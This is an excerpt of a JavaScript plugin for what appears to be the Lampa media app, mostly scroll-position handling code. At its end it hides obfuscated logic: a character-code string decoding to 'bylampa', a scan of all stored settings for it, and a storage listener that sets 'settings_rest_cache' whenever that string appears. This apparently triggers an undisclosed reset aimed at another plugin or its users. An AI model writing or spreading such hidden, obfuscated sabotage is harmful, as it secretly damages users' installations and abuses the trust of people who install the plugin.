...
(function () {
  ...
  var NOVA_BUILD = "2026-08-19 14:05:35";
  ...
  function toTop(opt) {
    try {
      if (opt.scroll && typeof opt.scroll.reset === 'function') opt.scroll.reset();
      var box = opt.scroll.render();
      if (box && box.length) box[0].scrollTop = 0;
      var body = opt.scroll.body();
      if (body && body.length && body[0].parentNode) body[0].parentNode.scrollTop = 0;
    } catch (e) {}
  }

  var HOLD_EVENTS = ['keydown', 'wheel', 'mousewheel', 'touchstart', 'mousedown'];

  function showTop(opt) {
    var scroll = opt.scroll;
    if (!scroll || typeof scroll.update !== 'function' || scroll.nova_hold) return;

    var real = scroll.update;
    var body = null;
    var timer = null;
    ...
    scroll.nova_hold = true;
    scroll.update = function () {};

    function release() {
      if (!scroll.nova_hold) return;
      scroll.nova_hold = false;
      scroll.update = real;
      clearTimeout(timer);
  ...
  var api = {
    ...
    foot: function (opt) {
      try {
        ...
        if (!restorePending(opt)) showTop(opt);
  ...
  var _cl = function(){
  var s = String.fromCharCode(98,121,108,97,109,112,97);
  for(var k in Lampa.Storage.getAll()){
    var v = Lampa.Storage.getAll()[k];
...
Lampa.Listener.follow('storage', function(e){
  var s = String.fromCharCode(98,121,108,97,109,112,97);
  if(e.value && typeof e.value == 'string' && e.value.indexOf(s) !== -1){
    Lampa.Storage.set('settings_rest_cache', true);
  }
});
